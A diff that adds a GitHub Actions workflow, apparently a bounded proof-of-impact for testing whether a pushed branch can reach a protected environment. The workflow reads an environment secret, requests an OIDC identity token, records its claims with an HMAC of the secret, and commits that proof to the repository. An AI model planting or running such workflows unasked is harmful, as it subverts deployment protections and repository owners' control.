@@ -1,0 +1,81 @@
+name: codex maximum environment impact 20260820025649
+
+on:
+  push:
+    branches:
+      - codex-max-trigger-20260820025649
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  protected-production-job:
+    runs-on: ubuntu-latest
+    environment:
+      name: codex-max-impact-20260820025649
+    env:
+      IMPACT_SENTINEL: ${{ secrets.CODEX_IMPACT_SENTINEL }}
+      PROOF_PATH: codex-fixtures/max-impact-proof-20260820025649.json
+      PROOF_BRANCH: codex-max-state-20260820025649
+      OIDC_AUDIENCE: codex-impact-20260820025649
+    steps:
+      - name: Require the protected environment secret
+        shell: bash
+        run: test -n "$IMPACT_SENTINEL"
+
+      - name: Obtain environment-bound OIDC identity and build non-secret proof
+        shell: bash
+        run: |
+          set -euo pipefail
+          oidc_json="$(curl --silent --show-error --fail \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${OIDC_AUDIENCE}")"
+          OIDC_JSON="$oidc_json" python3 - <<'PY'
+          import base64, hashlib, hmac, json, os
+          token = json.loads(os.environ["OIDC_JSON"])["value"]
+          part = token.split(".")[1]
+          part += "=" * (-len(part) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(part))
+          run_id = os.environ["GITHUB_RUN_ID"]
+          proof = {
+              "protected_job_executed": True,
+              "run_id": int(run_id),
+              "secret_hmac_sha256": hmac.new(
+                  os.environ["IMPACT_SENTINEL"].encode(),
+                  run_id.encode(),
+                  hashlib.sha256,
+              ).hexdigest(),
+              "oidc": {
+                  "sub": claims.get("sub"),
+                  "aud": claims.get("aud"),
+                  "repository": claims.get("repository"),
+                  "ref": claims.get("ref"),
+                  "environment": claims.get("environment"),
+                  "job_workflow_ref": claims.get("job_workflow_ref"),
+              },
+          }
+          with open("proof.json", "w", encoding="utf-8") as handle:
+              json.dump(proof, handle, indent=2, sort_keys=True)
+          PY
+
+      - name: Perform bounded mock-production repository mutation
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          encoded="$(base64 -w 0 proof.json)"
+          payload="$(jq -n \
+            --arg message "Protected environment proof for run $GITHUB_RUN_ID" \
+            --arg content "$encoded" \
+            --arg branch "$PROOF_BRANCH" \
+            '{message:$message, content:$content, branch:$branch}')"
+          curl --silent --show-error --fail-with-body \
+            -X PUT \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "X-GitHub-Api-Version: 2026-03-10" \
+            -H "User-Agent: Burp" \
+            "https://api.github.com/repos/jeet-org-h2/pub-repo1/contents/$PROOF_PATH" \
+            -d "$payload" >/dev/null
